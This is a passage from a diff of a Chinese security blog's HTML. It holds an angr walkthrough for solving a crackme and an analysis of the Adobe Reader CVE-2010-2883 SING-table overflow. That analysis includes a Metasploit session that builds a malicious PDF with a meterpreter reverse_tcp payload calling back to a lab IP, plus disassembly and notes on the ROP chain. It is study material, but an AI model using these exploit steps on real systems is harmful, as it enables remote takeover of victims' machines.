+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ ltrace ./jack</span><br><span class="line">puts(&quot;Enter your key: &quot;Enter your key: </span><br><span class="line">)                         = 17</span><br><span class="line">fgets(adf</span><br><span class="line">&quot;adf\n&quot;, 17, 0x7f8f337f0a00)               = 0x7ffd58fe1040</span><br><span class="line">strlen(&quot;adf\n&quot;)                                  = 4</span><br><span class="line">puts(&quot;Try Harder&quot;Try Harder</span><br><span class="line">)                               = 11</span><br><span class="line">puts(&quot;bye&quot;bye</span><br><span class="line">)                                      = 4</span><br><span class="line">+++ exited (status 1) +++</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这为我们提供了一些关于我们面对的问题的有用的信息。<br>看来问题是找到程序的key（可能不止一个）。<br>接下来，我决定在 Ghidra 中加载二进制文件，以便更好地了解发生了什么。</p>
+<p>反编译主程序：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">bool main(void)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  uint uVar1;</span><br><span class="line">  size_t sVar2;</span><br><span class="line">  long in_FS_OFFSET;</span><br><span class="line">  uint local_38;</span><br><span class="line">  int local_34;</span><br><span class="line">  int local_30;</span><br><span class="line">  int local_2c;</span><br><span class="line">  char local_28;</span><br><span class="line">  char local_27;</span><br><span class="line">  char local_26;</span><br><span class="line">  char local_25;</span><br><span class="line">  char local_24;</span><br><span class="line">  char local_23;</span><br><span class="line">  char local_22;</span><br><span class="line">  char local_21;</span><br><span class="line">  char local_20;</span><br><span class="line">  char local_1f;</span><br><span class="line">  char local_1e;</span><br><span class="line">  char local_1d;</span><br><span class="line">  char local_1c;</span><br><span class="line">  char local_1b;</span><br><span class="line">  char local_1a;</span><br><span class="line">  char local_19;</span><br><span class="line">  undefined local_18;</span><br><span class="line">  long local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(long *)(in_FS_OFFSET + 0x28);</span><br><span class="line">  puts(&quot;Enter your key: &quot;);</span><br><span class="line">  fgets(&amp;local_28,0x11,stdin);</span><br><span class="line">  local_18 = 0;</span><br><span class="line">  sVar2 = strlen(&amp;local_28);</span><br><span class="line">  if (sVar2 != 0x10) &#123;</span><br><span class="line">    puts(&quot;Try Harder&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    local_38 = local_25 * 0x1000000 + (int)local_28 + local_27 * 0x100 + local_26 * 0x10000;</span><br><span class="line">    local_38 = local_38 ^ ((int)local_38 &gt;&gt; 3 &amp; 0x20000000U) + local_38 * 0x20;</span><br><span class="line">    local_38 = local_38 ^ local_38 &lt;&lt; 7;</span><br><span class="line">    local_38 = (local_38 &gt;&gt; 1 &amp; 0xff) + local_38;</span><br><span class="line">    local_38 = ((int)local_38 &gt;&gt; 3 &amp; 0x20000000U) + local_38 * 0x20 ^ local_38;</span><br><span class="line">    local_38 = local_38 ^ local_38 &lt;&lt; 7;</span><br><span class="line">    local_38 = local_38 + (local_38 &gt;&gt; 1 &amp; 0xff);</span><br><span class="line">    uVar1 = local_21 * 0x1000000 + (int)local_24 + local_23 * 0x100 + local_22 * 0x10000;</span><br><span class="line">    uVar1 = uVar1 ^ ((int)uVar1 &gt;&gt; 3 &amp; 0x20000000U) + uVar1 * 0x20;</span><br><span class="line">    uVar1 = uVar1 ^ uVar1 &lt;&lt; 7;</span><br><span class="line">    uVar1 = (uVar1 &gt;&gt; 1 &amp; 0xff) + uVar1;</span><br><span class="line">    uVar1 = ((int)uVar1 &gt;&gt; 3 &amp; 0x20000000U) + uVar1 * 0x20 ^ uVar1;</span><br><span class="line">    uVar1 = uVar1 ^ uVar1 &lt;&lt; 7;</span><br><span class="line">    local_34 = uVar1 + (uVar1 &gt;&gt; 1 &amp; 0xff);</span><br><span class="line">    uVar1 = local_1d * 0x1000000 + (int)local_20 + local_1f * 0x100 + local_1e * 0x10000;</span><br><span class="line">    uVar1 = uVar1 ^ ((int)uVar1 &gt;&gt; 3 &amp; 0x20000000U) + uVar1 * 0x20;</span><br><span class="line">    uVar1 = uVar1 ^ uVar1 &lt;&lt; 7;</span><br><span class="line">    uVar1 = (uVar1 &gt;&gt; 1 &amp; 0xff) + uVar1;</span><br><span class="line">    uVar1 = ((int)uVar1 &gt;&gt; 3 &amp; 0x20000000U) + uVar1 * 0x20 ^ uVar1;</span><br><span class="line">    uVar1 = uVar1 ^ uVar1 &lt;&lt; 7;</span><br><span class="line">    local_30 = uVar1 + (uVar1 &gt;&gt; 1 &amp; 0xff);</span><br><span class="line">    uVar1 = local_19 * 0x1000000 + (int)local_1c + local_1b * 0x100 + local_1a * 0x10000;</span><br><span class="line">    uVar1 = uVar1 ^ ((int)uVar1 &gt;&gt; 3 &amp; 0x20000000U) + uVar1 * 0x20;</span><br><span class="line">    uVar1 = uVar1 ^ uVar1 &lt;&lt; 7;</span><br><span class="line">    uVar1 = (uVar1 &gt;&gt; 1 &amp; 0xff) + uVar1;</span><br><span class="line">    uVar1 = ((int)uVar1 &gt;&gt; 3 &amp; 0x20000000U) + uVar1 * 0x20 ^ uVar1;</span><br><span class="line">    uVar1 = uVar1 ^ uVar1 &lt;&lt; 7;</span><br><span class="line">    local_2c = uVar1 + (uVar1 &gt;&gt; 1 &amp; 0xff);</span><br><span class="line">    check_flag(&amp;local_38);</span><br><span class="line">  &#125;</span><br><span class="line">  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) &#123;</span><br><span class="line">    return sVar2 != 0x10;</span><br><span class="line">  &#125;</span><br><span class="line">                    /* WARNING: Subroutine does not return */</span><br><span class="line">  __stack_chk_fail();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到这我们可以确定输入有16个字符长。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (sVar2 != 0x10) &#123;</span><br><span class="line">    puts(&quot;Try Harder&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br></pre></td></tr></table></figure>
+
+<p>然后经过一连串的异或移位，加法，乘法之后，调用了check_flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/* check_flag(unsigned int*) */</span><br><span class="line"></span><br><span class="line">void check_flag(uint *param_1)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  if ((((*param_1 == 0xcb9f59b7) &amp;&amp; (param_1[1] == 0x5b90f617)) &amp;&amp; (param_1[2] == 0x20e59633)) &amp;&amp;</span><br><span class="line">     (param_1[3] == 0x102fd1da)) &#123;</span><br><span class="line">    puts(&quot;Good Work!&quot;);</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Try Harder&quot;);</span><br><span class="line">  return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>假设我们的目标是来到“Good Work!”这一行。我们需要找到程序的正确的输入，（也许这里有多个答案，因为这个移位操作）。</p>
+<p>我们有以下的几个选择：</p>
+<blockquote>
+<p>&gt;暴力破解，16个字符，可能是字母符号数字…暴力太难了<br>&gt;逆向-动态/静态分析，尽管逆向不是很有趣，我们也可以在运行时改变一下param_1的值通过hook的方式…<br>&gt;打补丁，通过打补丁的方式让他到puts这里。但让我们假设我们不想做任何的改变。<br>&gt;符号执行（Angr），我们今天的明显选择。另外，它为我们提供了一个实际有效的程序输入。</p>
+</blockquote>
+<h3 id="Angr"><a href="#Angr" class="headerlink" title="Angr"></a>Angr</h3><p>首先我们加载需要的库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br></pre></td></tr></table></figure>
+
+<p>接下来，我们将设置程序的基地址并通过 Angr 加载二进制文件。<br>我们会设置程序的基地址，并且设置”auto_load_libs”为false。<br><em>注意：设置”auto_load_libs”为false，将禁止CLE（Angr的二进制文件加载器）自动处理动态库依赖。我建议使用它，防止当某个动态库无法找到时，抛出异常。</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Ghidra loaded the binary to 0x00100000 (default Image Base)</span><br><span class="line">base_addr = 0x00100000 </span><br><span class="line"></span><br><span class="line">proj = angr.Project(&#x27;./jack&#x27;, main_opts=&#123;&#x27;base_addr&#x27;: base_addr&#125;, load_options=&#123;&quot;auto_load_libs&quot;: False&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>填上我们收集的二进制文件信息：<br>我们知道我们的输入需要16个字符的长度，因此，我们需要为我们的16个字符创建一个符号位向量。在把它们链接到一起之前，我为每个输入字节创建一个位向量。</p>
+<p><em>注意：位向量本质只是一串位序列，一个符号位向量只是一个符号变量，它在某种意义上不是保存具体的数值，而是保存一个符号。然后，使用该变量执行算术运算将产生一个运算树（根据编译器理论称为抽象语法树或 AST）。如示例中所示，AST 可以转换为约束。</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">input_length = 16</span><br><span class="line"></span><br><span class="line"># claripy.BVS(&#x27;x&#x27;, 8) =&gt; Create an eight-bit symbolic bitvector &quot;x&quot;.</span><br><span class="line"># Creating a symbolic bitvector for each character:</span><br><span class="line">input_chars = [claripy.BVS(&quot;char_%d&quot; % i, 8) for i in range(input_length)]</span><br><span class="line">input = claripy.Concat(*input_chars)</span><br></pre></td></tr></table></figure>
+
+<p>接下来，在将程序的输入设置为stdin的同时获取程序的入口状态。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">entry_state = proj.factory.entry_state(args=[&quot;./jack&quot;], stdin=input)</span><br></pre></td></tr></table></figure>
+
+<p>添加约束条件，以便每个字符都必须在可打印的 ascii 范围内。 这只是我的一个假设，我们不知道它是真是假。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for byte in input_chars:</span><br><span class="line">    entry_state.solver.add(byte &gt;= 0x20, byte &lt;= 0x7e)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>现在我们已经完成了设置，我们可以用符号模拟二进制的执行了。我们还需要关键的一个东西SimulationManager。有了它我们就可以控制多种状态，step() run()就像调试器一样。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Establish the simulation with the entry state</span><br><span class="line">simulation = proj.factory.simulation_manager(entry_state)</span><br></pre></td></tr></table></figure>
+
+<p>现在我们可以使用符号执行程序了，我们应该设置一些目标。我们可以设置Angr应该运行到哪，哪一个分支不用关心</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">success_addr = 0x00101489 # Address of &quot;puts(&quot;Good Work!&quot;);&quot;</span><br><span class="line">failure_addr = 0x00101468 # Address of &quot;puts(&quot;Try Harder&quot;);&quot;</span><br><span class="line"></span><br><span class="line"># Finding a state that reaches `success_addr`, while discarding all states that go through `failure_addr`</span><br><span class="line">simulation.explore(find = success_addr, avoid = failure_addr)</span><br></pre></td></tr></table></figure>
+
+<p>检查我们是否执行到success_addr就很简单了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># If at least one state was found</span><br><span class="line">if len(simulation.found) &gt; 0:</span><br><span class="line">    # Take the first one and print what it evaluates to</span><br><span class="line">    solution = simulation.found[0]</span><br><span class="line">    print(solution.solver.eval(input, cast_to=bytes))</span><br><span class="line">else:</span><br><span class="line">    print(&quot;[-] no solution found :(&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在原来的程序上执行脚本的结果，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;n0_5ymb0l1c,3x30&#x27;</span><br><span class="line"></span><br><span class="line">❯ ./jack</span><br><span class="line">Enter your key: </span><br><span class="line">n0_5ymb0l1c,3x30</span><br><span class="line">Good Work!</span><br><span class="line">bye</span><br></pre></td></tr></table></figure>
+
+<h2 id="六、结论"><a href="#六、结论" class="headerlink" title="六、结论"></a>六、结论</h2><p>Angr在有些情况下，比如在上面的例子中，的确非常有用，你可以使用它作为一个单独的工具或者一些逆向工具的开源插件，例如：IDA，Ghidra，Binary Ninja或者更多。</p>
+
+	
+	</div>
+  <a type="button" href="/2021/06/26/Angr初探/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2020/12/13/Josephus/" >Josephus</a>
 		</h3>
 		</div>
@@ -346,41 +662,41 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search cve-2010-2883</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                            Disclosure Date  Rank   Check  Description</span></span><br><span class="line">   -  ----                                            ---------------  ----   -----  -----------</span><br><span class="line">   0  exploit/windows/browser/adobe_cooltype_sing     2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow</span><br><span class="line">   1  exploit/windows/fileformat/adobe_cooltype_sing  2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow</span><br><span class="line">msf5 &gt; use exploit/windows/fileformat/adobe_cooltype_sing</span><br><span class="line">msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; options                                 Module options (exploit/windows/fileformat/adobe_cooltype_sing):           </span><br><span class="line">   Name      Current Setting  Required  Description                         </span><br><span class="line">   ----      ---------------  --------  -----------                    </span><br><span class="line">   FILENAME  msf.pdf          yes       The file name.                                   </span><br><span class="line">   Exploit target:                                                               </span><br><span class="line">   Id  Name                                       </span><br><span class="line">   --  ----                                      </span><br><span class="line">   0   Automatic                                                   </span><br><span class="line">msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; set payload windows/meterpreter/reverse_tcp                                                  </span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp </span><br><span class="line">msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; options</span><br><span class="line">Module options (exploit/windows/fileformat/adobe_cooltype_sing):</span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   FILENAME  msf.pdf          yes       The file name.</span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line">   **DisablePayloadHandler: True   (no handler will be created!)**</span><br><span class="line">Exploit target:</span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line">msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; set LHOST 192.168.110.142</span><br><span class="line">LHOST =&gt; 192.168.110.142</span><br><span class="line">msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; set filename msf4444.pdf</span><br><span class="line">filename =&gt; msf4444.pdf</span><br><span class="line">msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; exploit </span><br><span class="line">[*] Creating &#x27;msf4444.pdf&#x27; file...</span><br><span class="line">[+] msf4444.pdf stored at /home/kali/.msf4/local/msf4444.pdf</span><br><span class="line">msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; back</span><br><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; options </span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line">Exploit target:</span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line">   </span><br><span class="line">msf5 exploit(multi/handler) &gt; set LHOST 192.168.110.142</span><br><span class="line">LHOST =&gt; 192.168.110.142</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>反弹shell成功：</p>
-<p><img src="%E5%8F%8D%E5%BC%B9shell.png"></p>
-<p><img src="%E5%8F%8D%E5%BC%B9shell2.png"></p>
+<p><img src="/.io//%E5%8F%8D%E5%BC%B9shell.png"></p>
+<p><img src="/.io//%E5%8F%8D%E5%BC%B9shell2.png"></p>
 <p>表明样本构造成功：</p>
 <h3 id="2-样本行为分析"><a href="#2-样本行为分析" class="headerlink" title="2.样本行为分析"></a>2.样本行为分析</h3><p>使用Process Monitor开启程序的监控，分析样本行为。这里我们主要检测其网络行为。我们发现其与192.168.110.142的地址通过4444端口进行tcp通信：</p>
-<p><img src="%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90.png"></p>
+<p><img src="/.io//%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90.png"></p>
 <h3 id="3-静态分析"><a href="#3-静态分析" class="headerlink" title="3.静态分析"></a>3.静态分析</h3><p>基于前人的探索，我们可以直接定位到漏洞位置；IDA Pro反汇编CoolType.dll库，搜索“SING”字符串，定位到下图位置：</p>
-<p><img src="SING.png"></p>
+<p><img src="/.io//SING.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">.text:0803DCF9                 push    ebp</span><br><span class="line">.text:0803DCFA                 sub     esp, 104h       ; 分配栈空间0x104</span><br><span class="line">.text:0803DD00                 lea     ebp, [esp-4]    ; strcat的dest</span><br><span class="line">.text:0803DD04                 mov     eax, ___security_cookie</span><br><span class="line">.text:0803DD09                 xor     eax, ebp</span><br><span class="line">.text:0803DD0B                 mov     [ebp+108h+var_4], eax</span><br><span class="line">.text:0803DD11                 push    4Ch</span><br><span class="line">.text:0803DD13                 mov     eax, offset sub_8184A54</span><br><span class="line">.text:0803DD18                 call    __EH_prolog3_catch</span><br><span class="line">.text:0803DD1D                 mov     eax, [ebp+108h+arg_C]</span><br><span class="line">.text:0803DD23                 mov     edi, [ebp+108h+arg_0]</span><br><span class="line">.text:0803DD29                 mov     ebx, [ebp+108h+arg_4]</span><br><span class="line">.text:0803DD2F                 mov     [ebp+108h+var_130], edi</span><br><span class="line">.text:0803DD32                 mov     [ebp+108h+var_138], eax</span><br><span class="line">.text:0803DD35                 call    sub_804172C</span><br><span class="line">.text:0803DD3A                 xor     esi, esi</span><br><span class="line">.text:0803DD3C                 cmp     dword ptr [edi+8], 3</span><br><span class="line">.text:0803DD40                 mov     [ebp+108h+var_10C], esi</span><br><span class="line">.text:0803DD43                 jz      loc_803DF00</span><br><span class="line">.text:0803DD49                 mov     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DD4C                 mov     [ebp+108h+var_120], esi</span><br><span class="line">.text:0803DD4F                 cmp     dword ptr [edi+0Ch], 1</span><br><span class="line">.text:0803DD53                 mov     byte ptr [ebp+108h+var_10C], 1</span><br><span class="line">.text:0803DD57                 jnz     loc_803DEA9</span><br><span class="line">.text:0803DD5D                 push    offset aName    ; &quot;name&quot;</span><br><span class="line">.text:0803DD62                 push    edi             ; int</span><br><span class="line">.text:0803DD63                 lea     ecx, [ebp+108h+var_124]</span><br><span class="line">.text:0803DD66                 mov     [ebp+108h+var_119], 0</span><br><span class="line">.text:0803DD6A                 call    sub_80217D7</span><br><span class="line">.text:0803DD6F                 cmp     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DD72                 jnz     short loc_803DDDD</span><br><span class="line">.text:0803DD74                 push    offset aSing    ; &quot;SING&quot;</span><br><span class="line">.text:0803DD79                 push    edi             ; int</span><br><span class="line">.text:0803DD7A                 lea     ecx, [ebp+108h+var_12C] ; SING表的入口地址</span><br><span class="line">.text:0803DD7D                 call    sub_8021B06</span><br><span class="line">.text:0803DD82                 mov     eax, [ebp+108h+var_12C] ; SING表的入口处的值</span><br><span class="line">.text:0803DD85                 cmp     eax, esi        ; 判断是否为NULL</span><br><span class="line">.text:0803DD87                 mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class="line">.text:0803DD8B                 jz      short loc_803DDC4 ; 为空则跳转</span><br><span class="line">.text:0803DD8D                 mov     ecx, [eax] ;字体版本资源号，这里是1.0版本，即00 10 00 00</span><br><span class="line">.text:0803DD8F                 and     ecx, 0FFFFh</span><br><span class="line">.text:0803DD95                 jz      short loc_803DD9F ; 发生跳转</span><br><span class="line">.text:0803DD97                 cmp     ecx, 100h</span><br><span class="line">.text:0803DD9D                 jnz     short loc_803DDC0</span><br><span class="line">.text:0803DD9F</span><br><span class="line">.text:0803DD9F loc_803DD9F:                            ; CODE XREF: sub_803DCF9+9Cj</span><br><span class="line">.text:0803DD9F                 add     eax, 10h</span><br><span class="line">.text:0803DDA2                 push    eax             ; char *src</span><br><span class="line">.text:0803DDA3                 lea     eax, [ebp+108h+var_108]</span><br><span class="line">.text:0803DDA6                 push    eax             ; char *dest</span><br><span class="line">.text:0803DDA7                 mov     [ebp+108h+var_108], 0</span><br><span class="line">.text:0803DDAB                 call    strcat          ; 造成溢出</span><br></pre></td></tr></table></figure>
 
 <h3 id="4-动态分析"><a href="#4-动态分析" class="headerlink" title="4.动态分析"></a>4.动态分析</h3><p>使用Olldbg attach到Adobe Reader进程，寻找CoolType.dll中的位置在下图所示位置：</p>
-<p><img src="OD1.png"></p>
+<p><img src="/.io//OD1.png"></p>
 <p>注意这里，之前断点一直没有触发，在网上找了好久，才找到如下解决方法：</p>
-<p><img src="OD2.png"></p>
+<p><img src="/.io//OD2.png"></p>
 <p>打开样本触发断点：</p>
-<p><img src="OD4.png"></p>
+<p><img src="/.io//OD4.png"></p>
 <p>继续执行，到造成溢出处断下，数据拷贝方向如下：</p>
-<p><img src="OD5.png"></p>
+<p><img src="/.io//OD5.png"></p>
 <p>f8执行，栈空间已被覆盖：</p>
-<p><img src="OD6.png"></p>
+<p><img src="/.io//OD6.png"></p>
 <p>参考漏洞战争，在这下个断点：</p>
-<p><img src="OD7.png"></p>
+<p><img src="/.io//OD7.png"></p>
 <p>f7单步步入，在此处返回，ROP指令1：</p>
-<p><img src="OD8.png"></p>
+<p><img src="/.io//OD8.png"></p>
 <p>ROP指令2：</p>
-<p><img src="ROP1.png"></p>
+<p><img src="/.io//ROP1.png"></p>
 <p>ROP指令3：</p>
-<p><img src="ROP2.png"></p>
+<p><img src="/.io//ROP2.png"></p>
 <p>ROP指令4：</p>
-<p><img src="ROP4.png"></p>
+<p><img src="/.io//ROP4.png"></p>
 <p>通过分析栈空间内容，可以分析处样本通过ROP技术调用了CreateFileA();</p>
 <p>CreateFileMapping();</p>
 <p>MapViewOfFile();</p>
 <p>memcpy()</p>
 <p>等一系列函数来绕过DEP保护。</p>
-<p><img src="Createfile.png"></p>
+<p><img src="/.io//Createfile.png"></p>
 
 	
 	</div>
@@ -908,7 +1224,7 @@
   <div class="row">
 	
 	
-		<h2 id="一、Python知识图谱"><a href="#一、Python知识图谱" class="headerlink" title="一、Python知识图谱"></a>一、Python知识图谱</h2><p><img src="python.png"></p>
